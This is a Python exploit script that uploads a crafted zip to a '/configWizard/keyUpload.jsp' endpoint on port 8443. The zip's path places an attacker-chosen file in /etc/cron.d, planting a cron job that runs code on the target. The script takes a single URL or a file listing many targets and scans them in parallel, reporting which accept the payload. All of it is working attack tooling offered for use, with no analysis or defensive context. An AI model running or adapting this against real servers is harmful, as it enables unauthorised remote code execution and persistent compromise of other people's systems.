#!/usr/bin/python3
import argparse
import requests
import zipfile
import urllib3
import multiprocessing
urllib3.disable_warnings()


def exploit(target):
    url = f'https://{target}:8443/configWizard/keyUpload.jsp'
    r = requests.post(url, files={'key': open('payload.zip', 'rb')}, verify=False)
    if 'SuccessfulUpload' in r.text:
        print(f'[+] {target}Payload successfully delivered')
        
    else:
        print(f'[-] {target} NOT vule')
        

def make_zip(payload_file):
    fullpath = '/etc/cron.d/payload'
    zf = zipfile.ZipFile('payload.zip', 'w')
    zf.write(payload_file, fullpath)
    zf.close()
    #print(f'[+] Wrote {payload_file} to {fullpath}')

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    
    parser.add_argument('-u', '--url', dest='url', help='Target Url')
    parser.add_argument('-uf', '--urlfiles', dest='urlfiles', help='Target Url File', type=argparse.FileType('r'))
    parser.add_argument('-pf', '--pocfile', dest='pocfile',help='The cronjob payload file', required=True)
    
    args = parser.parse_args()
    make_zip(args.pocfile)
    if args.urlfiles:
        pool = multiprocessing.Pool()
        for url in args.urlfiles:
            #print(now_time() + " [INFO]     正在检测:{}".format(url)+'\n', style='bold yellow')
            pool.apply(exploit, args=(url.strip('\n'),))
        pool.close()
        pool.join()
    elif args.url:
        #print(now_time() + " [INFO]     正在检测:{}".format(args.url)+'\n', style='bold yellow')
        exploit(args.url)
    else:
        print('缺少URL目标, 请使用 [-u URL] or [-uf urlfiles]')
    
